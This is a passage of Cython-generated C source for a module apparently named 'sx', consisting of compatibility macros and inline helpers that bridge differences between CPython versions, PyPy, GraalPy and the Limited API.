__Pyx_init_co_variables(void);\n#if PY_VERSION_HEX >= 0x030900A4 || defined(Py_IS_TYPE)\n  #define __Pyx_IS_TYPE(ob, type) Py_IS_TYPE(ob, type)\n#else\n  #define __Pyx_IS_TYPE(ob, type) (((const PyObject*)ob)->ob_type == (type))\n#endif\n#if PY_VERSION_HEX >= 0x030A00B1 || defined(Py_Is)\n  #define __Pyx_Py_Is(x, y)  Py_Is(x, y)\n#else\n  #define __Pyx_Py_Is(x, y) ((x) == (y))\n#endif\n#if PY_VERSION_HEX >= 0x030A00B1 || defined(Py_IsNone)\n  #define __Pyx_Py_IsNone(ob) Py_IsNone(ob)\n#else\n  #define __Pyx_Py_IsNone(ob) __Pyx_Py_Is((ob), Py_None)\n#endif\n#if PY_VERSION_HEX >= 0x030A00B1 || defined(Py_IsTrue)\n  #define __Pyx_Py_IsTrue(ob) Py_IsTrue(ob)\n#else\n  #define __Pyx_Py_IsTrue(ob) __Pyx_Py_Is((ob), Py_True)\n#endif\n#if PY_VERSION_HEX >= 0x030A00B1 || defined(Py_IsFalse)\n  #define __Pyx_Py_IsFalse(ob) Py_IsFalse(ob)\n#else\n  #define __Pyx_Py_IsFalse(ob) __Pyx_Py_Is((ob), Py_False)\n#endif\n#define __Pyx_NoneAsNull(obj)  (__Pyx_Py_IsNone(obj) ? NULL : (obj))\n#if PY_VERSION_HEX >= 0x030900F0 && !CYTHON_COMPILING_IN_PYPY\n  #define __Pyx_PyObject_GC_IsFinalized(o) PyObject_GC_IsFinalized(o)\n#else\n  #define __Pyx_PyObject_GC_IsFinalized(o) _PyGC_FINALIZED(o)\n#endif\n#ifndef Py_TPFLAGS_CHECKTYPES\n  #define Py_TPFLAGS_CHECKTYPES 0\n#endif\n#ifndef Py_TPFLAGS_HAVE_INDEX\n  #define Py_TPFLAGS_HAVE_INDEX 0\n#endif\n#ifndef Py_TPFLAGS_HAVE_NEWBUFFER\n  #define Py_TPFLAGS_HAVE_NEWBUFFER 0\n#endif\n#ifndef Py_TPFLAGS_HAVE_FINALIZE\n  #define Py_TPFLAGS_HAVE_FINALIZE 0\n#endif\n#ifndef Py_TPFLAGS_SEQUENCE\n  #define Py_TPFLAGS_SEQUENCE 0\n#endif\n#ifndef Py_TPFLAGS_MAPPING\n  #define Py_TPFLAGS_MAPPING 0\n#endif\n#ifndef METH_STACKLESS\n  #define METH_STACKLESS 0\n#endif\n#ifndef METH_FASTCALL\n  #ifndef METH_FASTCALL\n     #define METH_FASTCALL 0x80\n  #endif\n  typedef PyObject *(*__Pyx_PyCFunctionFast) (PyObject *self, PyObject *const *args, Py_ssize_t nargs);\n  typedef PyObject *(*__Pyx_PyCFunctionFastWithKeywords) (PyObject *self, PyObject *const *args,\n                                                          Py_ssize_t nargs, PyObject *kwnames);\n#else\n  #if PY_VERSION_HEX >= 0x030d00A4\n  #  define __Pyx_PyCFunctionFast PyCFunctionFast\n  #  define __Pyx_PyCFunctionFastWithKeywords PyCFunctionFastWithKeywords\n  #else\n  #  define __Pyx_PyCFunctionFast _PyCFunctionFast\n  #  define __Pyx_PyCFunctionFastWithKeywords _PyCFunctionFastWithKeywords\n  #endif\n#endif\n#if CYTHON_METH_FASTCALL\n  #define __Pyx_METH_FASTCALL METH_FASTCALL\n  #define __Pyx_PyCFunction_FastCall __Pyx_PyCFunctionFast\n  #define __Pyx_PyCFunction_FastCallWithKeywords __Pyx_PyCFunctionFastWithKeywords\n#else\n  #define __Pyx_METH_FASTCALL METH_VARARGS\n  #define __Pyx_PyCFunction_FastCall PyCFunction\n  #define __Pyx_PyCFunction_FastCallWithKeywords PyCFunctionWithKeywords\n#endif\n#if CYTHON_VECTORCALL\n  #define __pyx_vectorcallfunc vectorcallfunc\n  #define __Pyx_PY_VECTORCALL_ARGUMENTS_OFFSET  PY_VECTORCALL_ARGUMENTS_OFFSET\n  #define __Pyx_PyVectorcall_NARGS(n)  PyVectorcall_NARGS((size_t)(n))\n#elif CYTHON_BACKPORT_VECTORCALL\n  typedef PyObject *(*__pyx_vectorcallfunc)(PyObject *callable, PyObject *const *args,\n                                            size_t nargsf, PyObject *kwnames);\n  #define __Pyx_PY_VECTORCALL_ARGUMENTS_OFFSET  ((size_t)1 << (8 * sizeof(size_t) - 1))\n  #define __Pyx_PyVectorcall_NARGS(n)  ((Py_ssize_t)(((size_t)(n)) & ~__Pyx_PY_VECTORCALL_ARGUMENTS_OFFSET))\n#else\n  #define __Pyx_PY_VECTORCALL_ARGUMENTS_OFFSET  0\n  #define __Pyx_PyVectorcall_NARGS(n)  ((Py_ssize_t)(n))\n#endif\n#if PY_VERSION_HEX >= 0x030900B1\n#define __Pyx_PyCFunction_CheckExact(func)  PyCFunction_CheckExact(func)\n#else\n#define __Pyx_PyCFunction_CheckExact(func)  PyCFunction_Check(func)\n#endif\n#define __Pyx_CyOrPyCFunction_Check(func)  PyCFunction_Check(func)\n#if CYTHON_COMPILING_IN_CPYTHON\n#define __Pyx_CyOrPyCFunction_GET_FUNCTION(func)  (((PyCFunctionObject*)(func))->m_ml->ml_meth)\n#elif !CYTHON_COMPILING_IN_LIMITED_API\n#define __Pyx_CyOrPyCFunction_GET_FUNCTION(func)  PyCFunction_GET_FUNCTION(func)\n#endif\n#if CYTHON_COMPILING_IN_CPYTHON\n#define __Pyx_CyOrPyCFunction_GET_FLAGS(func)  (((PyCFunctionObject*)(func))->m_ml->ml_flags)\nstatic CYTHON_INLINE PyObject* __Pyx_CyOrPyCFunction_GET_SELF(PyObject *func) {\n    return (__Pyx_CyOrPyCFunction_GET_FLAGS(func) & METH_STATIC) ? NULL : ((PyCFunctionObject*)func)->m_self;\n}\n#endif\nstatic CYTHON_INLINE int __Pyx__IsSameCFunction(PyObject *func, void (*cfunc)(void)) {\n#if CYTHON_COMPILING_IN_LIMITED_API\n    return PyCFunction_Check(func) && PyCFunction_GetFunction(func) == (PyCFunction) cfunc;\n#else\n    return PyCFunction_Check(func) && PyCFunction_GET_FUNCTION(func) == (PyCFunction) cfunc;\n#endif\n}\n#define __Pyx_IsSameCFunction(func, cfunc)   __Pyx__IsSameCFunction(func, cfunc)\n#if __PYX_LIMITED_VERSION_HEX < 0x03090000\n  #define __Pyx_PyType_FromModuleAndSpec(m, s, b)  ((void)m, PyType_FromSpecWithBases(s, b))\n  typedef PyObject *(*__Pyx_PyCMethod)(PyObject *, PyTypeObject *, PyObject *const *, size_t, PyObject *);\n#else\n  #define __Pyx_PyType_FromModuleAndSpec(m, s, b)  PyType_FromModuleAndSpec(m, s, b)\n  #define __Pyx_PyCMethod  PyCMethod\n#endif\n#ifndef METH_METHOD\n  #define METH_METHOD 0x200\n#endif\n#if CYTHON_COMPILING_IN_PYPY && !defined(PyObject_Malloc)\n  #define PyObject_Malloc(s)   PyMem_Malloc(s)\n  #define PyObject_Free(p)     PyMem_Free(p)\n  #define PyObject_Realloc(p)  PyMem_Realloc(p)\n#endif\n#if CYTHON_COMPILING_IN_LIMITED_API\n  #define __Pyx_PyFrame_SetLineNumber(frame, lineno)\n#elif CYTHON_COMPILING_IN_GRAAL\n  #define __Pyx_PyCode_HasFreeVars(co)  (PyCode_GetNumFree(co) > 0)\n  #define __Pyx_PyFrame_SetLineNumber(frame, lineno) _PyFrame_SetLineNumber((frame), (lineno))\n#else\n  #define __Pyx_PyCode_HasFreeVars(co)  (PyCode_GetNumFree(co) > 0)\n  #define __Pyx_PyFrame_SetLineNumber(frame, lineno)  (frame)->f_lineno = (lineno)\n#endif\n#if CYTHON_COMPILING_IN_LIMITED_API\n  #define __Pyx_PyThreadState_Current PyThreadState_Get()\n#elif !CYTHON_FAST_THREAD_STATE\n  #define __Pyx_PyThreadState_Current PyThreadState_GET()\n#elif PY_VERSION_HEX >= 0x030d00A1\n  #define __Pyx_PyThreadState_Current PyThreadState_GetUnchecked()\n#else\n  #define __Pyx_PyThreadState_Current _PyThreadState_UncheckedGet()\n#endif\n#if CYTHON_USE_MODULE_STATE\nstatic CYTHON_INLINE void *__Pyx__PyModule_GetState(PyObject *op)\n{\n    void *result;\n    result = PyModule_GetState(op);\n    if (!result)\n        Py_FatalError("Couldn\'t find the module state");\n    return result;\n}\n#define __Pyx_PyModule_GetState(o) (__pyx_mstatetype *)__Pyx__PyModule_GetState(o)\n#else\n#define __Pyx_PyModule_GetState(op) ((void)op,__pyx_mstate_global)\n#endif\n#define __Pyx_PyObject_GetSlot(obj, name, func_ctype)  __Pyx_PyType_GetSlot(Py_TYPE((PyObject *) obj), name, func_ctype)\n#define __Pyx_PyObject_TryGetSlot(obj, name, func_ctype) __Pyx_PyType_TryGetSlot(Py_TYPE(obj), name, func_ctype)\n#define __Pyx_PyObject_GetSubSlot(obj, sub, name, func_ctype) __Pyx_PyType_GetSubSlot(Py_TYPE(obj), sub, name, func_ctype)\n#define __Pyx_PyObject_TryGetSubSlot(obj, sub, name, func_ctype) __Pyx_PyType_TryGetSubSlot(Py_TYPE(obj), sub, name, func_ctype)\n#if CYTHON_USE_TYPE_SLOTS\n  #define __Pyx_PyType_GetSlot(type, name, func_ctype)  ((type)->name)\n  #define __Pyx_PyType_TryGetSlot(type, name, func_ctype) __Pyx_PyType_GetSlot(type, name, func_ctype)\n  #define __Pyx_PyType_GetSubSlot(type, sub, name, func_ctype) (((type)->sub) ? ((type)->sub->name) : NULL)\n  #define __Pyx_PyType_TryGetSubSlot(type, sub, name, func_ctype) __Pyx_PyType_GetSubSlot(type, sub, name, func_ctype)\n#else\n  #define __Pyx_PyType_GetSlot(type, name, func_ctype)  ((func_ctype) PyType_GetSlot((type), Py_##name))\n  #define __Pyx_PyType_TryGetSlot(type, name, func_ctype)\\\n    ((__PYX_LIMITED_VERSION_HEX >= 0x030A0000 ||\\\n     (PyType_GetFlags(type) & Py_TPFLAGS_HEAPTYPE) || __Pyx_get_runtime_version() >= 0x030A0000) ?\\\n     __Pyx_PyType_GetSlot(type, name, func_ctype) : NULL)\n  #define __Pyx_PyType_GetSubSlot(obj, sub, name, func_ctype) __Pyx_PyType_GetSlot(obj, name, func_ctype)\n  #define __Pyx_PyType_TryGetSubSlot(obj, sub, name, func_ctype) __Pyx_PyType_TryGetSlot(obj, name, func_ctype)\n#endif\n#if CYTHON_COMPILING_IN_CPYTHON || defined(_PyDict_NewPresized)\n#define __Pyx_PyDict_NewPresized(n)  ((n <= 8) ? PyDict_New() : _PyDict_NewPresized(n))\n#else\n#define __Pyx_PyDict_NewPresized(n)  PyDict_New()\n#endif\n#define __Pyx_PyNumber_Divide(x,y)         PyNumber_TrueDivide(x,y)\n#define __Pyx_PyNumber_InPlaceDivide(x,y)  PyNumber_InPlaceTrueDivide(x,y)\n#if CYTHON_COMPILING_IN_CPYTHON && CYTHON_USE_UNICODE_INTERNALS\n#define __Pyx_PyDict_GetItemStrWithError(dict, name)  _PyDict_GetItem_KnownHash(dict, name, ((PyASCIIObject *) name)->hash)\nstatic CYTHON_INLINE PyObject * __Pyx_PyDict_GetItemStr(PyObject *dict, PyObject *name) {\n    PyObject *res = __Pyx_PyDict_GetItemStrWithError(dict, name);\n    if (res == NULL) PyErr_Clear();\n    return res;\n}\n#elif !CYTHON_COMPILING_IN_PYPY || PYPY_VERSION_NUM >= 0x07020000\n#define __Pyx_PyDict_GetItemStrWithError  PyDict_GetItemWithError\n#define __Pyx_PyDict_GetItemStr           PyDict_GetItem\n#else\nstatic CYTHON_INLINE PyObject * __Pyx_PyDict_GetItemStrWithError(PyObject *dict, PyObject *name) {\n#if CYTHON_COMPILING_IN_PYPY\n    return PyDict_GetItem(dict, name);\n#else\n    PyDictEntry *ep;\n    PyDictObject *mp = (PyDictObject*) dict;\n    long hash = ((PyStringObject *) name)->ob_shash;\n    assert(hash != -1);\n    ep = (mp->ma_lookup)(mp, name, hash);\n    if (ep == NULL) {\n        return NULL;\n    }\n    return ep->me_value;\n#endif\n}\n#define __Pyx_PyDict_GetItemStr           PyDict_GetItem\n#endif\n#if CYTHON_USE_TYPE_SLOTS\n  #define __Pyx_PyType_GetFlags(tp)   (((PyTypeObject *)tp)->tp_flags)\n  #define __Pyx_PyType_HasFeature(type, feature)  ((__Pyx_PyType_GetFlags(type) & (feature)) != 0)\n#else\n  #define __Pyx_PyType_GetFlags(tp)   (PyType_GetFlags((PyTypeObject *)tp))\n  #define __Pyx_PyType_HasFeature(type, feature)  PyType_HasFeature(type, feature)\n#endif\n#define __Pyx_PyObject_GetIterNextFunc(iterator)  __Pyx_PyObject_GetSlot(iterator, tp_iternext, iternextfunc)\n#if CYTHON_USE_TYPE_SPECS && PY_VERSION_HEX >= 0x03080000\n#define __Pyx_PyHeapTypeObject_GC_Del(obj)  {\\\n    PyTypeObject *type = Py_TYPE((PyObject*)obj);\\\n    assert(__Pyx_PyType_HasFeature(type, Py_TPFLAGS_HEAPTYPE));\\\n    PyObject_GC_Del(obj);\\\n    Py_DECREF(type);\\\n}\n#else\n#define __Pyx_PyHeapTypeObject_GC_Del(obj)  PyObject_GC_Del(obj)\n#endif\n#if CYTHON_COMPILING_IN_LIMITED_API\n  #define __Pyx_PyUnicode_READY(op)       (0)\n  #define __Pyx_PyUnicode_READ_CHAR(u, i) PyUnicode_ReadChar(u, i)\n  #define __Pyx_PyUnicode_MAX_CHAR_VALUE(u)   ((void)u, 1114111U)\n  #define __Pyx_PyUnicode_KIND(u)         ((void)u, (0))\n  #define __Pyx_PyUnicode_DATA(u)         ((void*)u)\n  #define __Pyx_PyUnicode_READ(k, d, i)   ((void)k, PyUnicode_ReadChar((PyObject*)(d), i))\n  #define __Pyx_PyUnicode_IS_TRUE(u)      (0 != PyUnicode_GetLength(u))\n#else\n  #if PY_VERSION_HEX >= 0x030C0000\n    #define __Pyx_PyUnicode_READY(op)       (0)\n  #else\n    #define __Pyx_PyUnicode_READY(op)       (likely(PyUnicode_IS_READY(op)) ?\\\n                                                0 : _PyUnicode_Ready((PyObject *)(op)))\n  #endif\n  #define __Pyx_PyUnicode_READ_CHAR(u, i) PyUnicode_READ_CHAR(u, i)\n  #define __Pyx_PyUnicode_MAX_CHAR_VALUE(u)   PyUnicode_MAX_CHAR_VALUE(u)\n  #define __Pyx_PyUnicode_KIND(u)         ((int)PyUnicode_KIND(u))\n  #define __Pyx_PyUnicode_DATA(u)         PyUnicode_DATA(u)\n  #define __Pyx_PyUnicode_READ(k, d, i)   PyUnicode_READ(k, d, i)\n  #define __Pyx_PyUnicode_WRITE(k, d, i, ch)  PyUnicode_WRITE(k, d, i, (Py_UCS4) ch)\n  #if PY_VERSION_HEX >= 0x030C0000\n    #define __Pyx_PyUnicode_IS_TRUE(u)      (0 != PyUnicode_GET_LENGTH(u))\n  #else\n    #if CYTHON_COMPILING_IN_CPYTHON && PY_VERSION_HEX >= 0x03090000\n    #define __Pyx_PyUnicode_IS_TRUE(u)      (0 != (likely(PyUnicode_IS_READY(u)) ? PyUnicode_GET_LENGTH(u) : ((PyCompactUnicodeObject *)(u))->wstr_length))\n    #else\n    #define __Pyx_PyUnicode_IS_TRUE(u)      (0 != (likely(PyUnicode_IS_READY(u)) ? PyUnicode_GET_LENGTH(u) : PyUnicode_GET_SIZE(u)))\n    #endif\n  #endif\n#endif\n#if CYTHON_COMPILING_IN_PYPY\n  #define __Pyx_PyUnicode_Concat(a, b)      PyNumber_Add(a, b)\n  #define __Pyx_PyUnicode_ConcatSafe(a, b)  PyNumber_Add(a, b)\n#else\n  #define __Pyx_PyUnicode_Concat(a, b)      PyUnicode_Concat(a, b)\n  #define __Pyx_PyUnicode_ConcatSafe(a, b)  ((unlikely((a) == Py_None) || unlikely((b) == Py_None)) ?\\\n      PyNumber_Add(a, b) : __Pyx_PyUnicode_Concat(a, b))\n#endif\n#if CYTHON_COMPILING_IN_PYPY\n  #if !defined(PyUnicode_DecodeUnicodeEscape)\n    #define PyUnicode_DecodeUnicodeEscape(s, size, errors)  PyUnicode_Decode(s, size, "unicode_escape", errors)\n  #endif\n  #if !defined(PyUnicode_Contains)\n    #define PyUnicode_Contains(u, s)  PySequence_Contains(u, s)\n  #endif\n  #if !defined(PyByteArray_Check)\n    #define PyByteArray_Check(obj)  PyObject_TypeCheck(obj, &PyByteArray_Type)\n  #endif\n  #if !defined(PyObject_Format)\n    #define PyObject_Format(obj, fmt)  PyObject_CallMethod(obj, "__format__", "O", fmt)\n  #endif\n#endif\n#define __Pyx_PyUnicode_FormatSafe(a, b)  ((unlikely((a) == Py_None || (PyUnicode_Check(b) && !PyUnicode_CheckExact(b)))) ? PyNumber_Remainder(a, b) : PyUnicode_Format(a, b))\n#if CYTHON_COMPILING_IN_CPYTHON\n  #define __Pyx_PySequence_ListKeepNew(obj)\\\n    (likely(PyList_CheckExact(obj) && Py_REFCNT(obj) == 1) ? __Pyx_NewRef(obj) : PySequence_List(obj))\n#else\n  #define __Pyx_PySequence_ListKeepNew(obj)  PySequence_List(obj)\n#endif\n#ifndef PySet_CheckExact\n  #define PySet_CheckExact(obj)        __Pyx_IS_TYPE(obj, &PySet_Type)\n#endif\n#if PY_VERSION_HEX >= 0x030900A4\n  #define __Pyx_SET_REFCNT(obj, refcnt) Py_SET_REFCNT(obj, refcnt)\n  #define __Pyx_SET_SIZE(obj, size) Py_SET_SIZE(obj, size)\n#else\n  #define __Pyx_SET_REFCNT(obj, refcnt) Py_REFCNT(obj) = (refcnt)\n  #define __Pyx_SET_SIZE(obj, size) Py_SIZE(obj) = (size)\n#endif\n#if CYTHON_AVOID_BORROWED_REFS || CYTHON_AVOID_THREAD_UNSAFE_BORROWED_REFS\n  #if __PYX_LIMITED_VERSION_HEX >= 0x030d0000\n    #define __Pyx_PyList_GetItemRef(o, i) PyList_GetItemRef(o, i)\n  #elif CYTHON_COMPILING_IN_LIMITED_API || !CYTHON_ASSUME_SAFE_MACROS\n    #define __Pyx_PyList_GetItemRef(o, i) (likely((i) >= 0) ? PySequence_GetItem(o, i) : (PyErr_SetString(PyExc_IndexError, "list index out of range"), (PyObject*)NULL))\n  #else\n    #define __Pyx_PyList_GetItemRef(o, i) PySequence_ITEM(o, i)\n  #endif\n#elif CYTHON_COMPILING_IN_LIMITED_API || !CYTHON_ASSUME_SAFE_MACROS\n  #if __PYX_LIMITED_VERSION_HEX >= 0x030d0000\n    #define __Pyx_PyList_GetItemRef(o, i) PyList_GetItemRef(o, i)\n  #else\n    #define __Pyx_PyList_GetItemRef(o, i) __Pyx_XNewRef(PyList_GetItem(o, i))\n  #endif\n#else\n  #define __Pyx_PyList_GetItemRef(o, i) __Pyx_NewRef(PyList_GET_ITEM(o, i))\n#endif\n#if __PYX_LIMITED_VERSION_HEX >= 0x030d0000\n#define __Pyx_PyDict_GetItemRef(dict, key, result) PyDict_GetItemRef(dict, key, result)\n#elif CYTHON_AVOID_BORROWED_REFS || CYTHON_AVOID_THREAD_UNSAFE_BORROWED_REFS\nstatic CYTHON_INLINE int __Pyx_PyDict_GetItemRef(PyObject *dict, PyObject *key, PyObject **result) {\n  *result = PyObject_GetItem(dict, key);\n  if (*result == NULL) {\n    if (PyErr_ExceptionMatches(PyExc_KeyError)) {\n      PyErr_Clear();\n      return 0;\n    }\n    return -1;\n  }\n  return 1;\n}\n#else\nstatic CYTHON_INLINE int __Pyx_PyDict_GetItemRef(PyObject *dict, PyObject *key, PyObject **result) {\n  *result = PyDict_GetItemWithError(dict, key);\n  if (*result == NULL) {\n    return PyErr_Occurred() ? -1 : 0;\n  }\n  Py_INCREF(*result);\n  return 1;\n}\n#endif\n#if defined(CYTHON_DEBUG_VISIT_CONST) && CYTHON_DEBUG_VISIT_CONST\n  #define __Pyx_VISIT_CONST(obj)  Py_VISIT(obj)\n#else\n  #define __Pyx_VISIT_CONST(obj)\n#endif\n#if CYTHON_ASSUME_SAFE_MACROS\n  #define __Pyx_PySequence_ITEM(o, i) PySequence_ITEM(o, i)\n  #define __Pyx_PySequence_SIZE(seq)  Py_SIZE(seq)\n  #define __Pyx_PyTuple_SET_ITEM(o, i, v) (PyTuple_SET_ITEM(o, i, v), (0))\n  #define __Pyx_PyTuple_GET_ITEM(o, i) PyTuple_GET_ITEM(o, i)\n  #define __Pyx_PyList_SET_ITEM(o, i, v) (PyList_SET_ITEM(o, i, v), (0))\n  #define __Pyx_PyList_GET_ITEM(o, i) PyList_GET_ITEM(o, i)\n#else\n  #define __Pyx_PySequence_ITEM(o, i) PySequence_GetItem(o, i)\n  #define __Pyx_PySequence_SIZE(seq)  PySequence_Size(seq)\n  #define __Pyx_PyTuple_SET_ITEM(o, i, v) PyTuple_SetItem(o, i, v)\n  #define __Pyx_PyTuple_GET_ITEM(o, i) PyTuple_GetItem(o, i)\n  #define __Pyx_PyList_SET_ITEM(o, i, v) PyList_SetItem(o, i, v)\n  #define __Pyx_PyList_GET_ITEM(o, i) PyList_GetItem(o, i)\n#endif\n#if CYTHON_ASSUME_SAFE_SIZE\n  #define __Pyx_PyTuple_GET_SIZE(o) PyTuple_GET_SIZE(o)\n  #define __Pyx_PyList_GET_SIZE(o) PyList_GET_SIZE(o)\n  #define __Pyx_PySet_GET_SIZE(o) PySet_GET_SIZE(o)\n  #define __Pyx_PyBytes_GET_SIZE(o) PyBytes_GET_SIZE(o)\n  #define __Pyx_PyByteArray_GET_SIZE(o) PyByteArray_GET_SIZE(o)\n  #define __Pyx_PyUnicode_GET_LENGTH(o) PyUnicode_GET_LENGTH(o)\n#else\n  #define __Pyx_PyTuple_GET_SIZE(o) PyTuple_Size(o)\n  #define __Pyx_PyList_GET_SIZE(o) PyList_Size(o)\n  #define __Pyx_PySet_GET_SIZE(o) PySet_Size(o)\n  #define __Pyx_PyBytes_GET_SIZE(o) PyBytes_Size(o)\n  #define __Pyx_PyByteArray_GET_SIZE(o) PyByteArray_Size(o)\n  #define __Pyx_PyUnicode_GET_LENGTH(o) PyUnicode_GetLength(o)\n#endif\n#if __PYX_LIMITED_VERSION_HEX >= 0x030d0000\n  #define __Pyx_PyImport_AddModuleRef(name) PyImport_AddModuleRef(name)\n#else\n  static CYTHON_INLINE PyObject *__Pyx_PyImport_AddModuleRef(const char *name) {\n      PyObject *module = PyImport_AddModule(name);\n      Py_XINCREF(module);\n      return module;\n  }\n#endif\n#if CYTHON_COMPILING_IN_PYPY && !defined(PyUnicode_InternFromString)\n  #define PyUnicode_InternFromString(s) PyUnicode_FromString(s)\n#endif\n#define __Pyx_PyLong_FromHash_t PyLong_FromSsize_t\n#define __Pyx_PyLong_AsHash_t   __Pyx_PyIndex_AsSsize_t\n#if __PYX_LIMITED_VERSION_HEX >= 0x030A0000\n    #define __Pyx_PySendResult PySendResult\n#else\n    typedef enum {\n        PYGEN_RETURN = 0,\n        PYGEN_ERROR = -1,\n        PYGEN_NEXT = 1,\n    } __Pyx_PySendResult;\n#endif\n#if CYTHON_COMPILING_IN_LIMITED_API || PY_VERSION_HEX < 0x030A00A3\n  typedef __Pyx_PySendResult (*__Pyx_pyiter_sendfunc)(PyObject *iter, PyObject *value, PyObject **result);\n#else\n  #define __Pyx_pyiter_sendfunc sendfunc\n#endif\n#if !CYTHON_USE_AM_SEND\n#define __PYX_HAS_PY_AM_SEND 0\n#elif __PYX_LIMITED_VERSION_HEX >= 0x030A0000\n#define __PYX_HAS_PY_AM_SEND 1\n#else\n#define __PYX_HAS_PY_AM_SEND 2  // our own backported implementation\n#endif\n#if __PYX_HAS_PY_AM_SEND < 2\n    #define __Pyx_PyAsyncMethodsStruct PyAsyncMethods\n#else\n    typedef struct {\n        unaryfunc am_await;\n        unaryfunc am_aiter;\n        unaryfunc am_anext;\n        __Pyx_pyiter_sendfunc am_send;\n    } __Pyx_PyAsyncMethodsStruct;\n    #define __Pyx_SlotTpAsAsync(s) ((PyAsyncMethods*)(s))\n#endif\n#if CYTHON_USE_AM_SEND && PY_VERSION_HEX < 0x030A00F0\n    #define __Pyx_TPFLAGS_HAVE_AM_SEND (1UL << 21)\n#else\n    #define __Pyx_TPFLAGS_HAVE_AM_SEND (0)\n#endif\n#if PY_VERSION_HEX >= 0x03090000\n#define __Pyx_PyInterpreterState_Get() PyInterpreterState_Get()\n#else\n#define __Pyx_PyInterpreterState_Get() PyThreadState_Get()->interp\n#endif\n#if CYTHON_COMPILING_IN_LIMITED_API && PY_VERSION_HEX < 0x030A0000\n#ifdef __cplusplus\nextern "C"\n#endif\nPyAPI_FUNC(void *) PyMem_Calloc(size_t nelem, size_t elsize);\n#endif\n#if CYTHON_COMPILING_IN_LIMITED_API\nstatic int __Pyx_init_co_variable(PyObject *inspect, const char* name, int *write_to) {\n    int value;\n    PyObject *py_value = PyObject_GetAttrString(inspect, name);\n    if (!py_value) return 0;\n    value = (int) PyLong_AsLong(py_value);\n    Py_DECREF(py_value);\n    *write_to = value;\n    return value != -1 || !PyErr_Occurred();\n}\nstatic int __Pyx_init_co_variables(void) {\n    PyObject *inspect;\n    int result;\n    inspect = PyImport_ImportModule("inspect");\n    result =\n#if !defined(CO_OPTIMIZED)\n        __Pyx_init_co_variable(inspect, "CO_OPTIMIZED", &CO_OPTIMIZED) &&\n#endif\n#if !defined(CO_NEWLOCALS)\n        __Pyx_init_co_variable(inspect, "CO_NEWLOCALS", &CO_NEWLOCALS) &&\n#endif\n#if !defined(CO_VARARGS)\n        __Pyx_init_co_variable(inspect, "CO_VARARGS", &CO_VARARGS) &&\n#endif\n#if !defined(CO_VARKEYWORDS)\n        __Pyx_init_co_variable(inspect, "CO_VARKEYWORDS", &CO_VARKEYWORDS) &&\n#endif\n#if !defined(CO_ASYNC_GENERATOR)\n        __Pyx_init_co_variable(inspect, "CO_ASYNC_GENERATOR", &CO_ASYNC_GENERATOR) &&\n#endif\n#if !defined(CO_GENERATOR)\n        __Pyx_init_co_variable(inspect, "CO_GENERATOR", &CO_GENERATOR) &&\n#endif\n#if !defined(CO_COROUTINE)\n        __Pyx_init_co_variable(inspect, "CO_COROUTINE", &CO_COROUTINE) &&\n#endif\n        1;\n    Py_DECREF(inspect);\n    return result ? 0 : -1;\n}\n#else\nstatic int __Pyx_init_co_variables(void) {\n    return 0;  // It\'s a limited API-only feature\n}\n#endif\n\n\n#if defined(_WIN32) || defined(WIN32) || defined(MS_WINDOWS)\n  #ifndef _USE_MATH_DEFINES\n    #define _USE_MATH_DEFINES\n  #endif\n#endif\n#include <math.h>\n#ifdef NAN\n#define __PYX_NAN() ((float) NAN)\n#else\nstatic CYTHON_INLINE float __PYX_NAN() {\n  float value;\n  memset(&value, 0xFF, sizeof(value));\n  return value;\n}\n#endif\n#if defined(__CYGWIN__) && defined(_LDBL_EQ_DBL)\n#define __Pyx_truncl trunc\n#else\n#define __Pyx_truncl truncl\n#endif\n\n#ifndef CYTHON_CLINE_IN_TRACEBACK_RUNTIME\n#define CYTHON_CLINE_IN_TRACEBACK_RUNTIME 0\n#endif\n#ifndef CYTHON_CLINE_IN_TRACEBACK\n#define CYTHON_CLINE_IN_TRACEBACK CYTHON_CLINE_IN_TRACEBACK_RUNTIME\n#endif\n#if CYTHON_CLINE_IN_TRACEBACK\n#define __PYX_MARK_ERR_POS(f_index, lineno)  { __pyx_filename = __pyx_f[f_index]; (void) __pyx_filename; __pyx_lineno = lineno; (void) __pyx_lineno; __pyx_clineno = __LINE__; (void) __pyx_clineno; }\n#else\n#define __PYX_MARK_ERR_POS(f_index, lineno)  { __pyx_filename = __pyx_f[f_index]; (void) __pyx_filename; __pyx_lineno = lineno; (void) __pyx_lineno; (void) __pyx_clineno; }\n#endif\n#define __PYX_ERR(f_index, lineno, Ln_error) \\\n    { __PYX_MARK_ERR_POS(f_index, lineno) goto Ln_error; }\n\n#ifdef CYTHON_EXTERN_C\n    #undef __PYX_EXTERN_C\n    #define __PYX_EXTERN_C CYTHON_EXTERN_C\n#elif defined(__PYX_EXTERN_C)\n    #ifdef _MSC_VER\n    #pragma message ("Please do not define the \'__PYX_EXTERN_C\' macro externally. Use \'CYTHON_EXTERN_C\' instead.")\n    #else\n    #warning Please do not define the \'__PYX_EXTERN_C\' macro externally. Use \'CYTHON_EXTERN_C\' instead.\n    #endif\n#else\n  #ifdef __cplusplus\n    #define __PYX_EXTERN_C extern "C"\n  #else\n    #define __PYX_EXTERN_C extern\n  #endif\n#endif\n\n#define __PYX_HAVE__sx\n#define __PYX_HAVE_API__sx\n\n#ifdef _OPENMP\n#include <omp.h>\n#endif \n\n#if defined(PYREX_WITHOUT_ASSERTIONS) && !defined(CYTHON_WITHOUT_ASSERTIONS)\n#define CYTHON_WITHOUT_ASSERTIONS\n#endif\n\n#define __PYX_DEFAULT_STRING_ENCODING_IS_ASCII 0\n#define __PYX_DEFAULT_STRING_ENCODING_IS_UTF8 0\n#define __PYX_DEFAULT_STRING_ENCODING ""\n#define __Pyx_PyObject_FromString __Pyx_PyBytes_FromString\n#define __Pyx_PyObject_FromStringAndSize __Pyx_PyBytes_FromStringAndSize\n#define __Pyx_uchar_cast(c) ((unsigned char)c)\n#define __Pyx_long_cast(x) ((long)x)\n#define __Pyx_fits_Py_ssize_t(v, type, is_signed)  (\\\n    (sizeof(type) < sizeof(Py_ssize_t))  ||\\\n    (sizeof(type) > sizeof(Py_ssize_t) &&\\\n          likely(v < (type)PY_SSIZE_T_MAX ||\\\n                 v == (type)PY_SSIZE_T_MAX)  &&\\\n          (!is_signed || likely(v > (type)PY_SSIZE_T_MIN ||\\\n                                v == (type)PY_SSIZE_T_MIN)))  ||\\\n    (sizeof(type) == sizeof(Py_ssize_t) &&\\\n          (is_signed || likely(v < (type)PY_SSIZE_T_MAX ||\\\n                               v == (type)PY_SSIZE_T_MAX)))  )\nstatic CYTHON_INLINE int __Pyx_is_valid_index(Py_ssize_t i, Py_ssize_t limit) {\n    return (size_t) i < (size_t) limit;\n}\n#if defined (__cplusplus) && __cplusplus >= 201103L\n    #include 